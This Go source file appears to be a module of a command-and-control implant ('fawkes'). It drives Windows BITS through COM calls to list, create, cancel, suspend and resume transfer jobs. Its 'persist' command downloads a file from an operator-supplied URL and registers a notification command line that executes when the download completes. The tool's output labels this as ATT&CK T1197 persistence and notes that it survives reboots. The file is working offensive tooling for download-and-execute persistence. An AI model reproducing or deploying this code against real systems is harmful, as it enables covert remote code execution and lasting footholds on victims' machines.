//go:build windows
// +build windows

// bits_actions.go implements BITS job operations: list, create, persist, cancel, and
// generic job actions (suspend, resume, complete). Core COM infrastructure is in bits.go.

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	ole "github.com/go-ole/go-ole"

	"fawkes/pkg/structs"
)

// bitsJobEntry represents a BITS job for JSON output
type bitsJobEntry struct {
	JobID            string `json:"job_id"`
	Name             string `json:"name"`
	State            string `json:"state"`
	BytesTransferred uint64 `json:"bytes_transferred"`
	BytesTotal       uint64 `json:"bytes_total"`
	FilesTransferred uint32 `json:"files_transferred"`
	FilesTotal       uint32 `json:"files_total"`
}

func bitsList() structs.CommandResult {
	mgr, cleanup, err := bitsConnect()
	if err != nil {
		return errorf("Error connecting to BITS: %v", err)
	}
	defer cleanup()

	// IBackgroundCopyManager::EnumJobs(dwFlags, ppEnum)
	// BG_JOB_ENUM_ALL_USERS = 1
	var pEnum uintptr
	if _, err := bitsComCall(mgr, bitsVtEnumJobs, 0, uintptr(unsafe.Pointer(&pEnum))); err != nil {
		// Try with all-users flag (requires elevation)
		if _, err2 := bitsComCall(mgr, bitsVtEnumJobs, 1, uintptr(unsafe.Pointer(&pEnum))); err2 != nil {
			return errorf("Error enumerating BITS jobs: %v", err)
		}
	}
	defer bitsComCall(pEnum, 2) // Release

	// IEnumBackgroundCopyJobs::GetCount
	var count uint32
	bitsComCall(pEnum, bitsEnumVtGetCount, uintptr(unsafe.Pointer(&count)))

	var entries []bitsJobEntry

	for i := uint32(0); i < count; i++ {
		var pJob uintptr
		var fetched uint32
		hr, _ := bitsComCall(pEnum, bitsEnumVtNext, 1, uintptr(unsafe.Pointer(&pJob)), uintptr(unsafe.Pointer(&fetched)))
		if int32(hr) < 0 || fetched == 0 {
			break
		}

		// Get job ID
		var guid ole.GUID
		bitsComCall(pJob, bitsJobVtGetId, uintptr(unsafe.Pointer(&guid)))
		jobID := fmt.Sprintf("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
			guid.Data1, guid.Data2, guid.Data3,
			guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
			guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7])

		// Get display name
		var namePtr uintptr
		bitsComCall(pJob, bitsJobVtGetDisplayName, uintptr(unsafe.Pointer(&namePtr)))
		name := "(unknown)"
		if namePtr != 0 {
			name = bitsReadWString(namePtr)
			bitsCoTaskMemFree(namePtr)
		}

		// Get state
		var state uint32
		bitsComCall(pJob, bitsJobVtGetState, uintptr(unsafe.Pointer(&state)))
		stateStr := "Unknown"
		if int(state) < len(bitsJobStates) {
			stateStr = bitsJobStates[state]
		}

		// Get progress
		var progress bgJobProgress
		bitsComCall(pJob, bitsJobVtGetProgress, uintptr(unsafe.Pointer(&progress)))

		entries = append(entries, bitsJobEntry{
			JobID:            jobID,
			Name:             name,
			State:            stateStr,
			BytesTransferred: progress.BytesTransferred,
			BytesTotal:       progress.BytesTotal,
			FilesTransferred: progress.FilesTransferred,
			FilesTotal:       progress.FilesTotal,
		})

		bitsComCall(pJob, 2) // Release
	}

	if len(entries) == 0 {
		return successResult("[]")
	}

	data, err := json.Marshal(entries)
	if err != nil {
		return errorf("Error marshaling results: %v", err)
	}

	return successResult(string(data))
}

func bitsCreate(args bitsArgs) structs.CommandResult {
	if args.Name == "" || args.URL == "" || args.Path == "" {
		return errorResult("Error: name, url, and path are required for create action")
	}

	mgr, cleanup, err := bitsConnect()
	if err != nil {
		return errorf("Error connecting to BITS: %v", err)
	}
	defer cleanup()

	// CreateJob(DisplayName, Type, pJobId, ppJob)
	namePtr, _ := syscall.UTF16PtrFromString(args.Name)
	var jobGUID ole.GUID
	var pJob uintptr

	if _, err := bitsComCall(mgr, bitsVtCreateJob,
		uintptr(unsafe.Pointer(namePtr)),
		bgJobTypeDownload,
		uintptr(unsafe.Pointer(&jobGUID)),
		uintptr(unsafe.Pointer(&pJob)),
	); err != nil {
		return errorf("Error creating BITS job: %v", err)
	}
	defer bitsComCall(pJob, 2) // Release

	// AddFile(RemoteUrl, LocalName)
	urlPtr, _ := syscall.UTF16PtrFromString(args.URL)
	pathPtr, _ := syscall.UTF16PtrFromString(args.Path)

	if _, err := bitsComCall(pJob, bitsJobVtAddFile,
		uintptr(unsafe.Pointer(urlPtr)),
		uintptr(unsafe.Pointer(pathPtr)),
	); err != nil {
		bitsComCall(pJob, bitsJobVtCancel)
		return errorf("Error adding file to BITS job: %v", err)
	}

	// Resume (start the download)
	if _, err := bitsComCall(pJob, bitsJobVtResume); err != nil {
		return errorf("Error resuming BITS job: %v", err)
	}

	jobID := fmt.Sprintf("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
		jobGUID.Data1, jobGUID.Data2, jobGUID.Data3,
		jobGUID.Data4[0], jobGUID.Data4[1], jobGUID.Data4[2], jobGUID.Data4[3],
		jobGUID.Data4[4], jobGUID.Data4[5], jobGUID.Data4[6], jobGUID.Data4[7])

	return successf("[*] BITS Download Job Created (T1197)\n"+
		"[+] Job Name: %s\n"+
		"[+] Job ID:   %s\n"+
		"[+] URL:      %s\n"+
		"[+] Path:     %s\n"+
		"[+] Status:   Downloading\n",
		args.Name, jobID, args.URL, args.Path)
}

func bitsPersist(args bitsArgs) structs.CommandResult {
	if args.Name == "" || args.URL == "" || args.Path == "" || args.Command == "" {
		return errorResult("Error: name, url, path, and command are required for persist action")
	}

	mgr, cleanup, err := bitsConnect()
	if err != nil {
		return errorf("Error connecting to BITS: %v", err)
	}
	defer cleanup()

	// CreateJob
	namePtr, _ := syscall.UTF16PtrFromString(args.Name)
	var jobGUID ole.GUID
	var pJob uintptr

	if _, err := bitsComCall(mgr, bitsVtCreateJob,
		uintptr(unsafe.Pointer(namePtr)),
		bgJobTypeDownload,
		uintptr(unsafe.Pointer(&jobGUID)),
		uintptr(unsafe.Pointer(&pJob)),
	); err != nil {
		return errorf("Error creating BITS job: %v", err)
	}
	defer bitsComCall(pJob, 2) // Release

	// AddFile
	urlPtr, _ := syscall.UTF16PtrFromString(args.URL)
	pathPtr, _ := syscall.UTF16PtrFromString(args.Path)

	if _, err := bitsComCall(pJob, bitsJobVtAddFile,
		uintptr(unsafe.Pointer(urlPtr)),
		uintptr(unsafe.Pointer(pathPtr)),
	); err != nil {
		bitsComCall(pJob, bitsJobVtCancel)
		return errorf("Error adding file to BITS job: %v", err)
	}

	// QueryInterface for IBackgroundCopyJob2
	var pJob2 uintptr
	if _, err := bitsComCall(pJob, 0, // QueryInterface
		uintptr(unsafe.Pointer(iidBITSJob2)),
		uintptr(unsafe.Pointer(&pJob2)),
	); err != nil {
		bitsComCall(pJob, bitsJobVtCancel)
		return errorf("Error getting IBackgroundCopyJob2 (BITS 1.5+ required): %v", err)
	}
	defer bitsComCall(pJob2, 2) // Release

	// SetNotifyCmdLine(Program, Parameters)
	cmdPtr, _ := syscall.UTF16PtrFromString(args.Command)
	var paramsPtr *uint16
	if args.CmdArgs != "" {
		paramsPtr, _ = syscall.UTF16PtrFromString(args.CmdArgs)
	}

	if _, err := bitsComCall(pJob2, bitsJob2VtSetNotifyCmdLine,
		uintptr(unsafe.Pointer(cmdPtr)),
		uintptr(unsafe.Pointer(paramsPtr)),
	); err != nil {
		bitsComCall(pJob, bitsJobVtCancel)
		return errorf("Error setting notification command: %v", err)
	}

	// SetNotifyFlags (BG_NOTIFY_JOB_TRANSFERRED | BG_NOTIFY_JOB_ERROR)
	bitsComCall(pJob, bitsJobVtSetNotifyFlags, bgNotifyJobTransferred|bgNotifyJobError)

	// Resume
	if _, err := bitsComCall(pJob, bitsJobVtResume); err != nil {
		return errorf("Error resuming BITS job: %v", err)
	}

	jobID := fmt.Sprintf("{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
		jobGUID.Data1, jobGUID.Data2, jobGUID.Data3,
		jobGUID.Data4[0], jobGUID.Data4[1], jobGUID.Data4[2], jobGUID.Data4[3],
		jobGUID.Data4[4], jobGUID.Data4[5], jobGUID.Data4[6], jobGUID.Data4[7])

	cmdLine := args.Command
	if args.CmdArgs != "" {
		cmdLine += " " + args.CmdArgs
	}

	return successf("[*] BITS Persistence Job Created (T1197)\n"+
		"[+] Job Name:    %s\n"+
		"[+] Job ID:      %s\n"+
		"[+] URL:         %s\n"+
		"[+] Local Path:  %s\n"+
		"[+] Notify Cmd:  %s\n"+
		"[+] Status:      Downloading (command runs on completion)\n"+
		"\n[!] The notification command will execute when the download completes.\n"+
		"[!] BITS jobs survive reboots and run as the creating user.\n",
		args.Name, jobID, args.URL, args.Path, cmdLine)
}

func bitsCancel(args bitsArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for cancel action (use 'list' to find job names)")
	}

	mgr, cleanup, err := bitsConnect()
	if err != nil {
		return errorf("Error connecting to BITS: %v", err)
	}
	defer cleanup()

	// Enumerate jobs to find by name
	var pEnum uintptr
	if _, err := bitsComCall(mgr, bitsVtEnumJobs, 0, uintptr(unsafe.Pointer(&pEnum))); err != nil {
		return errorf("Error enumerating BITS jobs: %v", err)
	}
	defer bitsComCall(pEnum, 2)

	var count uint32
	bitsComCall(pEnum, bitsEnumVtGetCount, uintptr(unsafe.Pointer(&count)))

	cancelled := 0
	for i := uint32(0); i < count; i++ {
		var pJob uintptr
		var fetched uint32
		hr, _ := bitsComCall(pEnum, bitsEnumVtNext, 1, uintptr(unsafe.Pointer(&pJob)), uintptr(unsafe.Pointer(&fetched)))
		if int32(hr) < 0 || fetched == 0 {
			break
		}

		var namePtr uintptr
		bitsComCall(pJob, bitsJobVtGetDisplayName, uintptr(unsafe.Pointer(&namePtr)))
		name := ""
		if namePtr != 0 {
			name = bitsReadWString(namePtr)
			bitsCoTaskMemFree(namePtr)
		}

		if strings.EqualFold(name, args.Name) {
			bitsComCall(pJob, bitsJobVtCancel)
			cancelled++
		}

		bitsComCall(pJob, 2)
	}

	if cancelled == 0 {
		return errorf("No BITS job found with name: %s", args.Name)
	}

	return successf("[+] Cancelled %d BITS job(s) named: %s", cancelled, args.Name)
}

// bitsJobAction performs a vtable action (suspend/resume/complete) on a BITS job by name.
func bitsJobAction(args bitsArgs, vtableIndex int, actionLabel string) structs.CommandResult {
	if args.Name == "" {
		return errorf("Error: name is required for %s action (use 'list' to find job names)", strings.ToLower(actionLabel))
	}

	mgr, cleanup, err := bitsConnect()
	if err != nil {
		return errorf("Error connecting to BITS: %v", err)
	}
	defer cleanup()

	var pEnum uintptr
	if _, err := bitsComCall(mgr, bitsVtEnumJobs, 0, uintptr(unsafe.Pointer(&pEnum))); err != nil {
		return errorf("Error enumerating BITS jobs: %v", err)
	}
	defer bitsComCall(pEnum, 2)

	var count uint32
	bitsComCall(pEnum, bitsEnumVtGetCount, uintptr(unsafe.Pointer(&count)))

	acted := 0
	for i := uint32(0); i < count; i++ {
		var pJob uintptr
		var fetched uint32
		hr, _ := bitsComCall(pEnum, bitsEnumVtNext, 1, uintptr(unsafe.Pointer(&pJob)), uintptr(unsafe.Pointer(&fetched)))
		if int32(hr) < 0 || fetched == 0 {
			break
		}

		var namePtr uintptr
		bitsComCall(pJob, bitsJobVtGetDisplayName, uintptr(unsafe.Pointer(&namePtr)))
		name := ""
		if namePtr != 0 {
			name = bitsReadWString(namePtr)
			bitsCoTaskMemFree(namePtr)
		}

		if strings.EqualFold(name, args.Name) {
			bitsComCall(pJob, vtableIndex)
			acted++
		}

		bitsComCall(pJob, 2)
	}

	if acted == 0 {
		return errorf("No BITS job found with name: %s", args.Name)
	}

	return successf("[+] %s %d BITS job(s) named: %s", actionLabel, acted, args.Name)
}
